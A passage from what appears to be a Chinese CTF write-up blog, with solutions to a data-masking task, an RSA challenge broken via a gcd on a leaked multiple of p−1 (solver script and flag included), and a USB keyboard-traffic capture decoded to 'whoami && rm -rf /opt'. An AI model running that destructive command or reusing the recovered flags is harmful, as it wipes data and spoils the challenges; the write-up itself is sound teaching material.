class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    knn = KNeighborsClassifier(n_neighbors=i)</span><br><span class="line">    knn.fit(X_train, y_train)</span><br><span class="line">    new_data = pd.read_csv(<span class="string">&#x27;2.csv&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">    X_new = new_data[[<span class="string">&#x27;防碰撞评分&#x27;</span>, <span class="string">&#x27;电池容量评分&#x27;</span>, <span class="string">&#x27;智能驾驶能力&#x27;</span>, <span class="string">&#x27;智能座舱评分&#x27;</span>]]</span><br><span class="line">    X_new_scaled = scaler.transform(X_new)</span><br><span class="line">    predictions = knn.predict(X_new_scaled)</span><br><span class="line">    result = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, predictions)),<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(result))</span><br></pre></td></tr></table></figure><p>最终flag：</p><p>flag{e0f095bd-16e6-4bf5-a1c5-3dce1d693aa5}</p><h2 id="数据安全">数据安全</h2><h3 id="数据脱敏">数据脱敏</h3><p>题目要求</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">为了抵抗黑客攻击导致数据拖库等问题，需要将敏感数据识别并脱敏存储成⼀个表。给定脱敏算法逻辑，要求选⼿⽣成脱敏后的数据表数据（所有数据均为随机⽣成，与现实世界⽆任何联系）。为了防⽌⼀些隐私数据泄漏，现需要对该数据表进⾏脱敏操作，请按照指定要求对各字段进⾏脱敏处理，并按照先行后列拼接字符串（不包含标题行），对此字符串进行md5计算，得到答案。</span><br><span class="line"></span><br><span class="line">脱敏要求：</span><br><span class="line">编号：⽆需脱敏。</span><br><span class="line"></span><br><span class="line">姓名：⼆字姓名对最后⼀位字使⽤ * 进⾏替换，三字姓名对中间⼀位字使⽤ * 进⾏替换，四字姓名对中间两位字使⽤ * 进⾏替换。</span><br><span class="line"></span><br><span class="line">手机号：请对中间五位信息使⽤ * 进⾏替换。</span><br><span class="line"></span><br><span class="line">身份证号码：请对除了前6位信息使⽤ * 进⾏替换。</span><br><span class="line"></span><br><span class="line">银⾏卡：请对前四位和后十位信息使⽤ * 进⾏替换。</span><br><span class="line"></span><br><span class="line">Email：请对字符 @ 前除 . 外的字符使⽤ * 进⾏替换。</span><br><span class="line"></span><br><span class="line">性别：替换成未知。</span><br><span class="line"></span><br><span class="line">微信号：请对为字符的信息使用 * 进行替换。</span><br></pre></td></tr></table></figure><p>比赛时以为是格式上有什么问题，怎么调都不对。没想到这里这个编号无需脱敏的意思是，编号也不用加到最终的字符串中。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mask_name</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> name[:-<span class="number">1</span>] + <span class="string">&#x27;*&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(name) == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> name[:<span class="number">1</span>] + <span class="string">&#x27;*&#x27;</span> + name[-<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(name) == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> name[:<span class="number">1</span>] + <span class="string">&#x27;**&#x27;</span> + name[-<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mask_phone</span>(<span class="params">phone</span>):</span><br><span class="line">    <span class="keyword">return</span> phone[:<span class="number">3</span>] + <span class="string">&#x27;*****&#x27;</span> + phone[-<span class="number">3</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mask_id</span>(<span class="params">id_number</span>):</span><br><span class="line">    <span class="keyword">return</span> id_number[:<span class="number">6</span>] + <span class="string">&#x27;*&#x27;</span> * (<span class="built_in">len</span>(id_number) - <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mask_bank_card</span>(<span class="params">bank_card</span>):</span><br><span class="line">    <span class="keyword">return</span> bank_card[:<span class="number">4</span>] + <span class="string">&#x27;*&#x27;</span> * (<span class="built_in">len</span>(bank_card) - <span class="number">14</span>) + bank_card[-<span class="number">10</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mask_email</span>(<span class="params">email</span>):</span><br><span class="line">    parts = email.split(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> parts[<span class="number">0</span>]:</span><br><span class="line">        prefix, suffix = parts[<span class="number">0</span>].rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        masked_prefix = <span class="string">&#x27;*&#x27;</span> * (<span class="built_in">len</span>(prefix) - <span class="number">1</span>) + prefix[-<span class="number">1</span>:] <span class="keyword">if</span> prefix <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> masked_prefix + <span class="string">&#x27;.&#x27;</span> + suffix + <span class="string">&#x27;@&#x27;</span> + parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;*&#x27;</span> * <span class="built_in">len</span>(parts[<span class="number">0</span>])+ <span class="string">&#x27;@&#x27;</span> + parts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mask_wechat</span>(<span class="params">wechat</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*&#x27;</span> * <span class="built_in">len</span>(wechat)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_row</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;姓名&#x27;</span>: mask_name(<span class="built_in">str</span>(row[<span class="string">&#x27;姓名&#x27;</span>])),</span><br><span class="line">        <span class="string">&#x27;手机号&#x27;</span>: mask_phone(<span class="built_in">str</span>(row[<span class="string">&#x27;手机号&#x27;</span>])),</span><br><span class="line">        <span class="string">&#x27;身份证号&#x27;</span>: mask_id(<span class="built_in">str</span>(row[<span class="string">&#x27;身份证号&#x27;</span>])),</span><br><span class="line">        <span class="string">&#x27;银行卡号&#x27;</span>: mask_bank_card(<span class="built_in">str</span>(row[<span class="string">&#x27;银行卡号&#x27;</span>])),</span><br><span class="line">        <span class="string">&#x27;Email&#x27;</span>: mask_email(<span class="built_in">str</span>(row[<span class="string">&#x27;Email&#x27;</span>])),</span><br><span class="line">        <span class="string">&#x27;性别&#x27;</span>: <span class="string">&#x27;未知&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;微信号&#x27;</span>: mask_wechat(<span class="built_in">str</span>(row[<span class="string">&#x27;微信号&#x27;</span>]))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取xlsx文件</span></span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;data.xlsx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化一个列表来存储处理后的数据</span></span><br><span class="line">processed_data = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理每一行数据</span></span><br><span class="line"><span class="keyword">for</span> index, row <span class="keyword">in</span> df.iterrows():</span><br><span class="line">    processed_row = process_row(row)</span><br><span class="line">    processed_data.append(processed_row)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建新的DataFrame</span></span><br><span class="line">new_df = pd.DataFrame(processed_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将所有处理过的数据拼接成一个字符串（不包括编号）</span></span><br><span class="line">combined_data = <span class="string">&#x27;&#x27;</span>.join(new_df.apply(<span class="keyword">lambda</span> row: <span class="string">&#x27;&#x27;</span>.join(row.values.astype(<span class="built_in">str</span>)), axis=<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(combined_data)</span><br><span class="line"><span class="comment"># 使用md5进行加密</span></span><br><span class="line">md5_hash = hashlib.md5(combined_data.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, md5_hash)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将处理后的数据写入新的xlsx文件</span></span><br><span class="line">new_df.to_excel(<span class="string">&#x27;masked_data.xlsx&#x27;</span>, index=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#Flag: b54cc7298aaaae763d605cf87bcd714a</span></span><br></pre></td></tr></table></figure><h2 id="crypto">Crypto</h2><h3 id="numbertheory">NumberTheory</h3><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hint</span><br><span class="line"></span><br><span class="line">flag=<span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">k=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> hint + <span class="number">233</span> * k == <span class="number">233</span> * k * p</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(hint)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 84099006955126261966925371456202769943592466221370095794235167154956697927281125181449320270460637820908574232493978429962263974458426503598700104493216727535451616752760724333653967152401716945549285008242019874215196489846481143398374860288545040874468108191037481101604627874268575884573685952474988256841</span></span><br><span class="line"><span class="comment"># 28098063654079651384124474197746356824080585622155888018279898490747561415908220072536298610509681898119018709183606442183944207485940115624047842734359988590155403601250406116023121958193303908964857108526965815235457652033182982467968474248778435731228104089366239566977364311197776651102290796373095167764</span></span><br><span class="line"><span class="comment"># 411245630228311610573345621334618725748702407327926883063919892785851166202383809662483938501531987094884084543300939673794551515912845363503988032311234800260819110323258416786417746444373651130257247926678135654564298408894174083333804257126735899220917359603430399033328133462456659839525671074605146583034398735379485362144932899212206419889556154825755723979850750847762362288223441051219637465296077020565435562941976546609555729574021362954126496825972439730</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由题 <span class="math display">\[hint+233*k=233*k*p\]</span> 变换得 <span class="math display">\[hint=233*k*(p-1)\]</span> 设a <span class="math display">\[a^{hint}\equiv a^{233*k*(p-1)}(mod\ p)\]</span></p><p>由费马小定理得 <span class="math display">\[a^{hint}\equiv1(mod\ p)\]</span> 因此 <span class="math display">\[p=gcd(a^{hint}-1,n)\]</span> exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">84099006955126261966925371456202769943592466221370095794235167154956697927281125181449320270460637820908574232493978429962263974458426503598700104493216727535451616752760724333653967152401716945549285008242019874215196489846481143398374860288545040874468108191037481101604627874268575884573685952474988256841</span></span><br><span class="line">c=<span class="number">28098063654079651384124474197746356824080585622155888018279898490747561415908220072536298610509681898119018709183606442183944207485940115624047842734359988590155403601250406116023121958193303908964857108526965815235457652033182982467968474248778435731228104089366239566977364311197776651102290796373095167764</span></span><br><span class="line">hint=<span class="number">411245630228311610573345621334618725748702407327926883063919892785851166202383809662483938501531987094884084543300939673794551515912845363503988032311234800260819110323258416786417746444373651130257247926678135654564298408894174083333804257126735899220917359603430399033328133462456659839525671074605146583034398735379485362144932899212206419889556154825755723979850750847762362288223441051219637465296077020565435562941976546609555729574021362954126496825972439730</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">a=<span class="number">2</span></span><br><span class="line">p=gmpy2.gcd(<span class="built_in">pow</span>(a,hint,n)-<span class="number">1</span>,n)</span><br><span class="line">q=n//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#flag&#123;a3878d9436b7c80e6ecfda33b7b0b840&#125;</span></span><br></pre></td></tr></table></figure><h2 id="能源行业">能源行业</h2><h3 id="usb">usb</h3><p><del>又来见识新的妙妙工具了</del></p><p>经典usb流量，knm.py把所有hid data提取出来</p><figure><img src="/images/能源安全大赛2025-复现/image-20250425213629859.png"alt="image-20250425213629859" /><figcaption aria-hidden="true">image-20250425213629859</figcaption></figure><p>然后处理数据</p><figure><img src="/images/能源安全大赛2025-复现/image-20250425214107329.png"alt="image-20250425214107329" /><figcaption aria-hidden="true">image-20250425214107329</figcaption></figure><p>或者用祖传脚本对应按键解码hiddata。解出来的东西不大精准，但大概也能看出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">KEYCODE_MAP = &#123;</span><br><span class="line">     <span class="number">0x04</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">0x05</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">0x06</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">0x07</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">0x08</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">0x09</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">0x0A</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">0x0B</span>: <span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">     <span class="number">0x0C</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">0x0D</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">0x0E</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">0x0F</span>: <span class="string">&#x27;l&#x27;</span>, <span class="number">0x10</span>:<span class="string">&#x27;m&#x27;</span>, <span class="number">0x11</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">0x12</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">0x13</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">     <span class="number">0x14</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">0x15</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">0x16</span>:<span class="string">&#x27;s&#x27;</span>, <span class="number">0x17</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">0x18</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">0x19</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">0x1A</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">0x1B</span>: <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">     <span class="number">0x1C</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">0x1D</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">0x1E</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">0x1F</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">0x20</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">0x21</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">0x22</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">0x23</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">     <span class="number">0x24</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">0x25</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">0x26</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">0x27</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">0x28</span>: <span class="string">&#x27;\n&#x27;</span>, <span class="number">0x29</span>: <span class="string">&#x27;Escape&#x27;</span>, <span class="number">0x2A</span>: <span class="string">&#x27;Backspace&#x27;</span>,</span><br><span class="line">     <span class="number">0x2B</span>: <span class="string">&#x27;Tab&#x27;</span>, <span class="number">0x2C</span>:<span class="string">&#x27; &#x27;</span>, <span class="number">0x2D</span>: <span class="string">&#x27;-&#x27;</span>, <span class="number">0x2E</span>: <span class="string">&#x27;=&#x27;</span>, <span class="number">0x2F</span>: <span class="string">&#x27;[&#x27;</span>, <span class="number">0x30</span>: <span class="string">&#x27;]&#x27;</span>, <span class="number">0x31</span>: <span class="string">&#x27;\\&#x27;</span>, <span class="number">0x32</span>: <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">     <span class="number">0x33</span>: <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="number">0x34</span>: <span class="string">&#x27;`&#x27;</span>, <span class="number">0x35</span>: <span class="string">&#x27;,&#x27;</span>, <span class="number">0x36</span>: <span class="string">&#x27;.&#x27;</span>, <span class="number">0x37</span>: <span class="string">&#x27;/&#x27;</span>, <span class="number">0x38</span>: <span class="string">&#x27;Caps Lock&#x27;</span>, <span class="number">0x39</span>: <span class="string">&#x27;F1&#x27;</span>,</span><br><span class="line">     <span class="number">0x3A</span>: <span class="string">&#x27;F2&#x27;</span>, <span class="number">0x3B</span>: <span class="string">&#x27;F3&#x27;</span>, <span class="number">0x3C</span>: <span class="string">&#x27;F4&#x27;</span>, <span class="number">0x3D</span>: <span class="string">&#x27;F5&#x27;</span>, <span class="number">0x3E</span>: <span class="string">&#x27;F6&#x27;</span>, <span class="number">0x3F</span>: <span class="string">&#x27;F7&#x27;</span>, <span class="number">0x40</span>: <span class="string">&#x27;F8&#x27;</span>,</span><br><span class="line">     <span class="number">0x41</span>: <span class="string">&#x27;F9&#x27;</span>, <span class="number">0x42</span>: <span class="string">&#x27;F10&#x27;</span>, <span class="number">0x43</span>: <span class="string">&#x27;F11&#x27;</span>, <span class="number">0x44</span>: <span class="string">&#x27;F12&#x27;</span>, <span class="number">0x45</span>: <span class="string">&#x27;Print Screen&#x27;</span>, <span class="number">0x46</span>: <span class="string">&#x27;Scroll Lock&#x27;</span>,</span><br><span class="line">     <span class="number">0x47</span>: <span class="string">&#x27;Pause&#x27;</span>, <span class="number">0x48</span>: <span class="string">&#x27;Insert&#x27;</span>, <span class="number">0x49</span>: <span class="string">&#x27;Home&#x27;</span>, <span class="number">0x4A</span>: <span class="string">&#x27;Page Up&#x27;</span>, <span class="number">0x4B</span>: <span class="string">&#x27;Delete&#x27;</span>, <span class="number">0x4C</span>: <span class="string">&#x27;End&#x27;</span>,</span><br><span class="line">     <span class="number">0x4D</span>: <span class="string">&#x27;Page Down&#x27;</span>, <span class="number">0x4E</span>: <span class="string">&#x27;Right Arrow&#x27;</span>, <span class="number">0x4F</span>: <span class="string">&#x27;Left Arrow&#x27;</span>, <span class="number">0x50</span>: <span class="string">&#x27;Down Arrow&#x27;</span>, <span class="number">0x51</span>: <span class="string">&#x27;Up Arrow&#x27;</span>,</span><br><span class="line">     <span class="number">0x52</span>: <span class="string">&#x27;Num Lock&#x27;</span>, <span class="number">0x53</span>: <span class="string">&#x27;Keypad /&#x27;</span>, <span class="number">0x54</span>: <span class="string">&#x27;Keypad *&#x27;</span>, <span class="number">0x55</span>: <span class="string">&#x27;Keypad -&#x27;</span>, <span class="number">0x56</span>: <span class="string">&#x27;Keypad +&#x27;</span>,</span><br><span class="line">     <span class="number">0x57</span>: <span class="string">&#x27;Keypad Enter&#x27;</span>, <span class="number">0x58</span>: <span class="string">&#x27;Keypad 1&#x27;</span>, <span class="number">0x59</span>: <span class="string">&#x27;Keypad 2&#x27;</span>, <span class="number">0x5A</span>: <span class="string">&#x27;Keypad 3&#x27;</span>, <span class="number">0x5B</span>: <span class="string">&#x27;Keypad 4&#x27;</span>,</span><br><span class="line">     <span class="number">0x5C</span>: <span class="string">&#x27;Keypad 5&#x27;</span>, <span class="number">0x5D</span>: <span class="string">&#x27;Keypad 6&#x27;</span>, <span class="number">0x5E</span>: <span class="string">&#x27;Keypad 7&#x27;</span>, <span class="number">0x5F</span>: <span class="string">&#x27;Keypad 8&#x27;</span>, <span class="number">0x60</span>: <span class="string">&#x27;Keypad 9&#x27;</span>,</span><br><span class="line">     <span class="number">0x61</span>: <span class="string">&#x27;Keypad 0&#x27;</span>, <span class="number">0x62</span>: <span class="string">&#x27;Keypad .&#x27;</span>, <span class="number">0x63</span>: <span class="string">&#x27;Non-US # and ~&#x27;</span>, <span class="number">0x64</span>: <span class="string">&#x27;Application&#x27;</span>, <span class="number">0x65</span>: <span class="string">&#x27;Power&#x27;</span>,</span><br><span class="line">     <span class="number">0x66</span>: <span class="string">&#x27;Keypad =&#x27;</span>, <span class="number">0x67</span>: <span class="string">&#x27;F13&#x27;</span>, <span class="number">0x68</span>: <span class="string">&#x27;F14&#x27;</span>, <span class="number">0x69</span>: <span class="string">&#x27;F15&#x27;</span>, <span class="number">0x6A</span>: <span class="string">&#x27;F16&#x27;</span>, <span class="number">0x6B</span>: <span class="string">&#x27;F17&#x27;</span>, <span class="number">0x6C</span>: <span class="string">&#x27;F18&#x27;</span>,</span><br><span class="line">     <span class="number">0x6D</span>: <span class="string">&#x27;F19&#x27;</span>, <span class="number">0x6E</span>: <span class="string">&#x27;F20&#x27;</span>, <span class="number">0x6F</span>: <span class="string">&#x27;F21&#x27;</span>, <span class="number">0x70</span>: <span class="string">&#x27;F22&#x27;</span>, <span class="number">0x71</span>: <span class="string">&#x27;F23&#x27;</span>, <span class="number">0x72</span>: <span class="string">&#x27;F24&#x27;</span>, <span class="number">0x73</span>: <span class="string">&#x27;Execute&#x27;</span>,</span><br><span class="line">     <span class="number">0x74</span>: <span class="string">&#x27;Help&#x27;</span>, <span class="number">0x75</span>: <span class="string">&#x27;Menu&#x27;</span>, <span class="number">0x76</span>: <span class="string">&#x27;Select&#x27;</span>, <span class="number">0x77</span>: <span class="string">&#x27;Stop&#x27;</span>, <span class="number">0x78</span>: <span class="string">&#x27;Again&#x27;</span>, <span class="number">0x79</span>: <span class="string">&#x27;Undo&#x27;</span>,</span><br><span class="line">     <span class="number">0x7A</span>: <span class="string">&#x27;Cut&#x27;</span>, <span class="number">0x7B</span>: <span class="string">&#x27;Copy&#x27;</span>, <span class="number">0x7C</span>: <span class="string">&#x27;Paste&#x27;</span>, <span class="number">0x7D</span>: <span class="string">&#x27;Find&#x27;</span>, <span class="number">0x7E</span>: <span class="string">&#x27;Mute&#x27;</span>, <span class="number">0x7F</span>: <span class="string">&#x27;Volume Up&#x27;</span>,</span><br><span class="line">     <span class="number">0x80</span>: <span class="string">&#x27;Volume Down&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_usb_keyboard_data</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bytes_data = <span class="built_in">bytes</span>.fromhex(data.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        keys = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(bytes_data)):</span><br><span class="line">            keycode = bytes_data[i]</span><br><span class="line">            <span class="keyword">if</span> keycode <span class="keyword">in</span> KEYCODE_MAP:</span><br><span class="line">                keys.append(KEYCODE_MAP[keycode])</span><br><span class="line">        <span class="keyword">return</span> keys</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入的不是有效的十六进制字符串&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">                line = line.strip()</span><br><span class="line">                decoded_keys = decode_usb_keyboard_data(line)</span><br><span class="line">                <span class="keyword">if</span> decoded_keys:</span><br><span class="line">                    s+=<span class="string">&#x27;&#x27;</span>.join(decoded_keys)</span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;文件 out.txt 不存在&quot;</span>)</span><br><span class="line"><span class="comment">#whoami 77 rm -rf Caps Lockopt</span></span><br></pre></td></tr></table></figure><p>whoami &amp;&amp; rm -rf /opt</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 能源安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TGCTF2025 Writeup+复现</title>
      <link href="/posts/4260fda8/"/>
      <url>/posts/4260fda8/</url>
      
